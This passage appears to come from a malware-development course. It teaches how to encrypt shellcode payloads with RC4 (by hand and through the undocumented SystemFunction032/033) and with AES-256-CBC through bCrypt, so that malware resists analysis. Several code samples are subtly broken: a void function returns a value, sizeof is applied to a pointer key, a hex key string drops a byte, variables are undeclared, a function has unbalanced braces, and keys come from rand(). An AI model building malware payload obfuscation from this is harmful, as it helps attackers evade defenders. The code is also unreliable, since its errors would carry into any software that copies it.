This method uses the RC4 implementation found??[here](https://www.oryx-embedded.com/doc/rc4_8c_source.html)??due to its stability and well-written code. There are two functions??`rc4Init`??and??`rc4Cipher`??which are used to initialize a??`rc4context`??structure and perform the RC4 encryption, respectively.

```c
typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length){
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}

```

#### RC4 Encryption

The code below shows how the??`rc4Init`??and??`rc4Cipher`??functions are used to encrypt a payload.

```c
	// Initialization
	Rc4Context ctx = { 0 };

	// Key used for encryption
	unsigned char* key = "maldev123";
	rc4Init(&ctx, key, sizeof(key));

	// Encryption //
	// plaintext - The payload to be encrypted
	// ciphertext - A buffer that is used to store the outputted encrypted data
	rc4Cipher(&ctx, plaintext, ciphertext, sizeof(plaintext));
```

#### RC4 Decryption

The code below shows how the??`rc4Init`??and??`rc4Cipher`??functions are used to decrypt a payload.

```c
	// Initialization
	Rc4Context ctx = { 0 };

	// Key used to decrypt
	unsigned char* key = "maldev123";
	rc4Init(&ctx, key, sizeof(key));

	// Decryption //
	// ciphertext - Encrypted payload to be decrypted
	// plaintext - A buffer that is used to store the outputted plaintext data
	rc4Cipher(&ctx, ciphertext, plaintext, sizeof(ciphertext));
```

### RC4 Encryption - Method 2

The undocumented Windows NTAPI??`SystemFunction032`??offers a faster and smaller implementation of the RC4 algorithm. Additional information about this API can be found on??[this Wine API page](https://source.winehq.org/WineAPI/SystemFunction032.html).

#### SystemFunction032

The documentation page states that the function??`SystemFunction032`??accepts two parameters of type??`USTRING`.

```c
 NTSTATUS SystemFunction032
 (
  struct ustring*       data,
  const struct ustring* key
 )
```

#### USTRING Structure

Unfortunately, since this is an undocumented API the structure of??`USTRING`??is unknown. But through additional research, it's possible to locate the??`USTRING`??structure definition in??[wine/crypt.h](https://github.com/wine-mirror/wine/blob/master/dlls/advapi32/crypt.h#L94). The structure is shown below.

```c
typedef struct
{
	DWORD	Length;         // Size of the data to encrypt/decrypt
	DWORD	MaximumLength;  // Max size of the data to encrypt/decrypt, although often its the same as Length (USTRING.Length = USTRING.MaximumLength = X)
	PVOID	Buffer;         // The base address of the data to encrypt/decrypt

} USTRING;
```

Now that the??`USTRING`??struct is known, the??`SystemFunction032`??function can be used.

#### Retrieving SystemFunction032's Address

To use??`SystemFunction032`, its address must first be retrieved. Since??`SystemFunction032`??is exported from??`advapi32.dll`, the DLL must be loaded into the process using??`LoadLibrary`. The return value of the function call can be used directly in??`GetProcAddress`.

Once the address of??`SystemFunction032`??has been successfully retrieved, it should be type-casted to a function pointer matching the definition found on the previously referenced??[Wine API page](https://source.winehq.org/WineAPI/SystemFunction032.html). However, the returned address can be casted directly from??`GetProcAddress`. This is all demonstrated in the snippet below.

```c
fnSystemFunction032 SystemFunction032 = (fnSystemFunction032) GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
```

The function pointer of??`SystemFunction032`??is defined as the??`fnSystemFunction032`??data type which is shown below.

```c
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,   // Structure of type USTRING that holds information about the buffer to encrypt / decrypt 
	struct USTRING* Key     // Structure of type USTRING that holds information about the key used while encryption / decryption
);
```

#### SystemFunction032 Usage

The snippet below provides a working code sample that utilizes the??`SystemFunction032`??function to perform RC4 encryption and decryption.

```c
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS STATUS	= NULL;
	
	USTRING Data = { 
		.Buffer         = pPayloadData,
		.Length         = sPayloadSize,
		.MaximumLength  = sPayloadSize
	};

	USTRING	Key = {
		.Buffer         = pRc4Key,
		.Length         = dwRc4KeySize,
		.MaximumLength  = dwRc4KeySize
	};

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```

### RC4 Encryption - Method 3

Another way to implement the RC4 algorithm is using the??`SystemFunction033`??which takes the same parameters as the previously shown??`SystemFunction032`??function.

```c

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
	struct USTRING* Data,
	struct USTRING* Key
	);


/*
Helper function that calls SystemFunction033
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;

	USTRING		Key = { 
			.Buffer        = pRc4Key, 
			.Length        = dwRc4KeySize,
			.MaximumLength = dwRc4KeySize 
	};
		
	USTRING 	Data = {
			.Buffer         = pPayloadData, 	
			.Length         = sPayloadSize,		
			.MaximumLength  = sPayloadSize 
	};

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

```

#### Encryption/Decryption Key Format

The code snippets in this module and other encryption modules use one valid way of representing the encryption/decryption key. However, it's important to be aware that the key can be represented using several different ways.

Be aware that hardcoding the plaintext key into the binary is considered bad practice and can be easily pulled when the malware is analyzed. Future modules will provide solutions to ensure the key cannot be easily retrieved.

```c
// Method 1
unsigned char* key = "maldev123";

// Method 2
// This is 'maldev123' represented as an array of hexadecimal bytes
unsigned char key[] = {
	0x6D, 0x61, 0x6C, 0x64, 0x65, 0x76, 0x31, 0x32, 0x33
};

// Method 3
// This is 'maldev123' represented in a hex/string form (hexadecimal escape sequence)
unsigned char* key = "\x6D\x61\x64\x65\x76\x31\x32\x33";

// Method 4 - better approach (via stack strings)
// This is 'maldev123' represented in an array of chars
unsigned char key[] = {
	'm', 'a', 'l', 'd', 'e', 'v', '1', '2', '3'
};
```
# 2.7 Payload Encryption - AES Encryption

### Advanced Encryption Standard

This module discusses a more secure encryption algorithm, Advanced Encryption Standard (AES). It is a symmetric-key algorithm, meaning the same key is used for both encryption and decryption. There are several types of AES encryption such as AES128, AES192, and AES256 that vary by the key size. For example, AES128 uses a 128-bit key whereas AES256 uses a 256-bit key.

Additionally, AES can use different??[block cipher modes of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)??such as CBC and GCM. Depending on the AES mode, the AES algorithm will require an additional component along with the encryption key called an??[Initialization Vector](https://en.wikipedia.org/wiki/Initialization_vector)??or IV. Providing an IV provides an additional layer of security to the encryption process.

Regardless of the chosen AES type, AES always requires a 128-bit input and produces a 128-bit output blocks. The important thing to keep in mind is that the input data should be multiples of 16 bytes (128 bits). If the payload being encrypted is not a multiple of 16 bytes then padding is required to increase the size of the payload and make it a multiple of 16 bytes.

The module provides 2 code samples that use AES256-CBC. The first sample is achieved through the bCrypt library which utilizes WinAPIs and the second sample uses??[Tiny Aes Project](https://github.com/kokke/tiny-AES-c). Note that since the AES256-CBC is being used, the code uses a 32-byte key and a 16-byte IV. Again, this would vary if the code used a different AES type or mode.

### AES Using WinAPIs (bCrypt Library)

There are several ways to implement the AES encryption algorithm. This section utilizes the bCrypt library ([bcrypt.h](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)) to perform AES encryption. This section will explain the code which is available for download as usual at the top right of the module box.

#### AES Structure

To start, an??`AES`??structure is created which contains the required data to perform encryption and decryption.

```c
typedef struct _AES {

	PBYTE	pPlainText;         // base address of the plain text data 
	DWORD	dwPlainSize;        // size of the plain text data

	PBYTE	pCipherText;        // base address of the encrypted data	
	DWORD	dwCipherSize;       // size of it (this can change from dwPlainSize in case there was padding)

	PBYTE	pKey;               // the 32 byte key
	PBYTE	pIv;                // the 16 byte iv

} AES, *PAES;
```

#### SimpleEncryption Wrapper

The??`SimpleEncryption`??function has six parameters that are used to initialize the??`AES`??structure. Once the structure is initialized, the function will call??`InstallAesEncryption`??to perform the AES encryption process. Note that two of its parameters are??`OUT`??parameters, therefore the function returns the following:

- `pCipherTextData`??- A pointer to the newly allocated heap buffer which contains the ciphertext data.
    
- `sCipherTextSize`??- The size of the ciphertext buffer.
    

The function returns??`TRUE`??if the??`InstallAesEncryption`??succeeds, otherwise??`FALSE`.

```c
// Wrapper function for InstallAesEncryption that makes things easier
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;
	
	// Intializing the struct
	AES Aes = {
		.pKey        = pKey,
		.pIv         = pIv,
		.pPlainText  = pPlainTextData,
		.dwPlainSize = sPlainTextSize
	};

	if (!InstallAesEncryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pCipherTextData = Aes.pCipherText;
	*sCipherTextSize = Aes.dwCipherSize;

	return TRUE;
}
```

#### SimpleDecryption Wrapper

The??`SimpleDecryption`??function also has six parameters and behaves similarly to??`SimpleEncryption`??with the difference being that it calls the??`InstallAesDecryption`??function and it returns two different values.

- `pPlainTextData`??- A pointer to the newly allocated heap buffer which contains the plaintext data.
    
- `sPlainTextSize`??- The size of the plaintext buffer.
    

The function returns??`TRUE`??if the??`InstallAesDecryption`??succeeds, otherwise??`FALSE`.

```c
// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey          = pKey,
		.pIv           = pIv,
		.pCipherText   = pCipherTextData,
		.dwCipherSize  = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}
```

#### Cryptographic Next Generation

Cryptographic Next Generation (CNG) provides a set of cryptographic functions that can be used by applications of the OS. CNG provides a standardized interface for cryptographic operations, making it easier for developers to implement security features in their applications. Both??`InstallAesEncryption`??and??`InstallAesDecryption`??functions make use of CNG.

More information about CNG is available??[here](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-portal).

#### InstallAesEncryption Function

The??`InstallAesEncryption`??is the function that performs AES encryption. The function has one parameter,??`PAES`, which is a pointer to a populated??`AES`??structure. The bCrypt library functions used in the function are shown below.

- [BCryptOpenAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider)??- Used to load the??[BCRYPT_AES_ALGORITHM](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers)??Cryptographic Next Generation (CNG) provider to enable the use of cryptographic functions.
    
- [BCryptGetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgetproperty)??- This function is called twice, the first time to retrieve the value of??[BCRYPT_OBJECT_LENGTH](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-property-identifiers)??and the second time to fetch the value of??[BCRYPT_BLOCK_LENGTH](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-property-identifiers)??property identifiers.
    
- [BCryptSetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty)??- Used to initialize the??`BCRYPT_OBJECT_LENGTH`??property identifier.
    
- [BCryptGenerateSymmetricKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgeneratesymmetrickey)??- Used to create a key object from the input AES key specified.
    
- [BCryptEncrypt](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptencrypt)??- Used to encrypt a specified block of data. This function is called twice, the first time retrieves the size of the encrypted data to allocate a heap buffer of that size. The second call encrypts the data and stores the ciphertext in the allocated heap.
    
- [BCryptDestroyKey](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdestroykey)??- Used to clean up by destroying the key object created using??`BCryptGenerateSymmetricKey`.
    
- [BCryptCloseAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider)??- Used to clean up by closing the object handle of the algorithm provider created earlier using??`BCryptOpenAlgorithmProvider`.
    

The function returns??`TRUE`??if it successfully encrypts the payload, otherwise??`FALSE`.

```c
// The encryption implementation
BOOL InstallAesEncryption(PAES pAes) {

  BOOL                  bSTATE           = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm       = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle       = NULL;

  ULONG       		cbResult         = NULL;
  DWORD       		dwBlockSize      = NULL;
  
  DWORD       		cbKeyObject      = NULL;
  PBYTE       		pbKeyObject      = NULL;

  PBYTE      		pbCipherText     = NULL;
  DWORD       		cbCipherText     = NULL,


  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
   	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Allocating enough memory for the output buffer, cbCipherText
  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
  if (pbCipherText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptEncrypt again with pbCipherText as the output buffer
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }


  // Clean up
_EndOfFunc:
  if (hKeyHandle) 
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm) 
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject) 
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipherText != NULL && bSTATE) {
        // If everything worked, save pbCipherText and cbCipherText 
        pAes->pCipherText 	= pbCipherText;
        pAes->dwCipherSize 	= cbCipherText;
  }
  return bSTATE;
}
```

#### InstallAesDecryption Function

The??`InstallAesDecryption`??is the function that performs AES decryption. The function has one parameter,??`PAES`, which is a pointer to a populated??`AES`??structure. The bCrypt library functions used in the function are the same as in the??`InstallAesEncryption`??function above, with the only difference being that??`BCryptDecrypt`??is used instead of??`BCryptEncrypt`.

- [BCryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdecrypt)??- Used to decrypt a specified block of data. This function is called twice, the first time retrieves the size of the decrypted data to allocate a heap buffer of that size. The second call decrypts the data and stores the plaintext data in the allocated heap.

The function returns??`TRUE`??if it successfully decrypts the payload, otherwise??`FALSE`.

```c
// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

  BOOL                  bSTATE          = TRUE;
  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;

  ULONG                 cbResult        = NULL;
  DWORD                 dwBlockSize     = NULL;
  
  DWORD                 cbKeyObject     = NULL;
  PBYTE                 pbKeyObject     = NULL;

  PBYTE                 pbPlainText     = NULL;
  DWORD                 cbPlainText     = NULL,

  // Intializing "hAlgorithm" as AES algorithm Handle
  STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Checking if block size is 16 bytes
  if (dwBlockSize != 16) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating memory for the key object 
  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (pbKeyObject == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Allocating enough memory for the output buffer, cbPlainText
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
    	bSTATE = FALSE; goto _EndOfFunc;
  }
  
  // Running BCryptDecrypt again with pbPlainText as the output buffer
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    	printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
    	bSTATE = FALSE; goto _EndOfFunc;
  }

  // Clean up
_EndOfFunc:
  if (hKeyHandle)
    	BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    	HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText   = pbPlainText;
        pAes->dwPlainSize  = cbPlainText;
  }
  return bSTATE;

}
```

#### Additional Helper Functions

The code also includes two small helper functions as well,??`PrintHexData`??and??`GenerateRandomBytes`.

The first function,??`PrintHexData`, prints an input buffer as a char array in C syntax to the console.

```c
// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

  printf("unsigned char %s[] = {", Name);

  for (int i = 0; i < Size; i++) {
    	if (i % 16 == 0)
      	    printf("\n\t");
	    
      if (i < Size - 1) {
          printf("0x%0.2X, ", Data[i]);
      } else {
          printf("0x%0.2X ", Data[i]);
      }

  printf("};\n\n\n");
  
}
```

The other function,??`GenerateRandomBytes`, fills up an input buffer with random bytes which in this case is used to generate a random key and IV.

```c
// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

  for (int i = 0; i < sSize; i++) {
    	pByte[i] = (BYTE)rand() % 0xFF;
  }

}
```

#### Padding

Both??`InstallAesEncryption`??and??`InstallAesDecryption`??functions use the??`BCRYPT_BLOCK_PADDING`??flag with the??`BCryptEncrypt`??and??`BCryptDecrypt`??bcrypt functions respectively, which will automatically pad the input buffer, if required, to be a multiple of 16 bytes, solving the AES padding issue.

#### Main Function - Encryption

The main function below is used to perform the encryption routine on an array of plaintext data.

```c
// The plaintext, in hex format, that will be encrypted
// this is the following string in hex "This is a plain text string, we'll try to encrypt/decrypt !"
unsigned char Data[] = {
	0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x6C,
	0x61, 0x69, 0x6E, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x72,
	0x69, 0x6E, 0x67, 0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74,
	0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
	0x74, 0x2F, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x21
};

int main() {

	BYTE pKey [KEYSIZE];                    // KEYSIZE is 32 bytes
	BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes

	srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
	GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function
	
	srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

	// Printing both key and IV onto the console 
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = NULL;
	
	// Encrypting
	if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &pCipherText, &dwCipherSize)) {
		return -1;
	}

	// Print the encrypted buffer as a hex array
	PrintHexData("CipherText", pCipherText, dwCipherSize);
	
	// Clean up
	HeapFree(GetProcessHeap(), 0, pCipherText);
	system("PAUSE");
	return 0;
}
```

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/encryption-new-225952410-4a747a9a-ef94-479c-be3b-d6ae5e8de27f.png)

#### Main Function - Decryption

The main function below is used to perform the decryption routine. The decryption routine requires the decryption key, IV and ciphertext.

```c
// the key printed to the screen
unsigned char pKey[] = {
		0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8, 0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
		0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D, 0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B };

// the iv printed to the screen
unsigned char pIv[] = {
		0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA, 0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD };


// the encrypted buffer printed to the screen, which is:
unsigned char CipherText[] = {
		0x97, 0xFC, 0x24, 0xFE, 0x97, 0x64, 0xDF, 0x61, 0x81, 0xD8, 0xC1, 0x9E, 0x23, 0x30, 0x79, 0xA1,
		0xD3, 0x97, 0x5B, 0xAE, 0x29, 0x7F, 0x70, 0xB9, 0xC1, 0xEC, 0x5A, 0x09, 0xE3, 0xA4, 0x44, 0x67,
		0xD6, 0x12, 0xFC, 0xB5, 0x86, 0x64, 0x0F, 0xE5, 0x74, 0xF9, 0x49, 0xB3, 0x0B, 0xCA, 0x0C, 0x04,
		0x17, 0xDB, 0xEF, 0xB2, 0x74, 0xC2, 0x17, 0xF6, 0x34, 0x60, 0x33, 0xBA, 0x86, 0x84, 0x85, 0x5E };

int main() {

	// Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
	PVOID	pPlaintext  = NULL;
	DWORD	dwPlainSize = NULL;

	// Decrypting
	if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}
	
	// Printing the decrypted data to the screen in hex format
